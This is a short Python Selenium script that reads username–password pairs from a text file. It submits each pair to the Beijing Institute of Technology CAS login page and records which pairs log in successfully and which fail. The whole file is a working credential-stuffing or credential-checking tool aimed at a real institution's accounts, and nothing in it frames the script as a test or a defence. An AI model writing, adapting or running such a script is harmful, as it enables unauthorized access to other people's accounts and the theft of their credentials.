import selenium
from selenium import webdriver


def openChrome():
    option = webdriver.ChromeOptions()
    option.add_argument('disable-infobars')
    driver = webdriver.Chrome(chrome_options=option)
    return driver


def operationAuth(driver, username, password):
    official = "https://login.bit.edu.cn/cas/login?service=http%3A%2F%2Fonline.bit.edu.cn%3A80%2Feip%2F"
    driver.get(official)

    driver.find_element_by_id("username").send_keys(username)
    driver.find_element_by_id("password").send_keys(password)
    driver.find_element_by_class_name("btn_image").click()
    html = driver.page_source
    try:
        msg = driver.find_element_by_id("msg").text
    except selenium.common.exceptions.NoSuchElementException as e:
        msg = None

    driver.close()
    return html, msg


def testpwd(username, password):
    driver_ = openChrome()
    html, msg = operationAuth(driver_, username, password)
    driver_.quit()
    return html, msg


def main():
    with open("raw.txt", "r") as f:
        with open("judge.txt", "a") as out:
            line = f.readline()
            while line:
                li = line.split()
                html, msg = testpwd(li[0], li[1])
                if msg:
                    out.write("Wrong login: {}\t{}\n".format(li[0], li[1]))
                else:
                    out.write("Valid login: {}\t{}\n".format(li[0], li[1]))
                line = f.readline()


if __name__ == "__main__":
    main()
